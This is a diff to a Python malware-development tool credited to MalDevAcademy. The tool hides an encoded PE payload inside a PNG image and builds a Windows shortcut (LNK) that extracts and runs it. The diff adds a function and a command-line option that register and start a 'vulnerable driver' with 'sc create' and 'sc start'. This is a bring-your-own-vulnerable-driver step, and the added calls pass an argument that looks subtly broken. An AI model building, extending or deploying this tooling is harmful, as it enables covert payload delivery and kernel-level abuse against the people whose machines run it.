@@ -1,7 +1,8 @@
 # @NUL0x4C | @mrd0x : MalDevAcademy
-import sys
-import subprocess
 import os
+import subprocess
+import sys
+
 
 def install(package):
     print(f"[i] Installing {package}...")
@@ -30,17 +31,17 @@ except ImportError:
     print("[i] Detected an missing library")
     install("pywin32")
 
-import zlib
-import shutil
-import os
-import sys
 import argparse
+import os
 import random
+import shutil
 import string
+import sys
+import zlib
 
 import pefile
-from win32com.client import Dispatch
 from colorama import Fore, Style, init
+from win32com.client import Dispatch
 
 PNG_SGN     = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'                       # PNG file signature  
 IDAT        = b'\x49\x44\x41\x54'                                       # 'IDAT'
@@ -172,6 +173,18 @@ def create_shortcut(lnk_path, arguments, icon_file="", icon_index=0, working_dir
 
 # ------------------------------------------------------------------------------------------------------------------------
 
+def load_vulnerable_driver(driver_path):
+    print(f"{Fore.WHITE}[i] Loading the vulnerable driver...{Style.RESET_ALL}")
+    try:
+        subprocess.check_call(["sc", "create", "vuln_driver", f"binPath= {driver_path}"], check=True)
+        subprocess.check_call(["sc", "start", "vuln_driver"], check=True)
+        print(f"{Fore.GREEN}[+] Vulnerable driver loaded successfully!{Style.RESET_ALL}")
+    except Exception as e:
+        print_red(f"[!] Failed to load the vulnerable driver: {e}")
+        sys.exit(1)
+
+# ------------------------------------------------------------------------------------------------------------------------
+
 def is_png(file_path):
 
     if not os.path.isfile(file_path):
@@ -188,7 +201,7 @@ def is_png(file_path):
 # ------------------------------------------------------------------------------------------------------------------------
 
 def is_pe(file_path):
-     if not os.path.isfile(file_path):
+    if not os.path.isfile(file_path):
         raise FileNotFoundError(f"[!] '{file_path}' does not exist")
          
     try:
@@ -244,6 +257,7 @@ def main():
     parser.add_argument('-i', '--input', type=str, required=True, help="Input PE payload file")
     parser.add_argument('-png', '--pngfile', type=str, required=True, help="Input PNG file to embed the PE payload into")
     parser.add_argument('-o', '--output', type=str, required=True, help="Output PNG/LNK file name")
+    parser.add_argument('-d', '--driver', type=str, required=False, help="Path to the vulnerable driver")
     args = parser.parse_args()
 
     # Add file extensions to output files (PNG/LNK)
@@ -269,6 +283,14 @@ def main():
     # create output png file
     xor_key_offset = plant_pe_in_png(args.pngfile, opng_fname, payload_data)
     print(f"[*] {Fore.YELLOW}{opng_fname}{Style.RESET_ALL} is created!")
+
+    # Load vulnerable driver if provided
+    if args.driver:
+        driver_path = os.path.abspath(args.driver)
+        if not os.path.exists(driver_path):
+            print_red(f"[!] '{driver_path}' does not exist")
+            sys.exit(1)
+        load_vulnerable_driver(driver_path)
 
     # create extraction command
     extraction_command = create_lnk_extraction_cmnd(xor_key_offset, opng_fname, args.input)
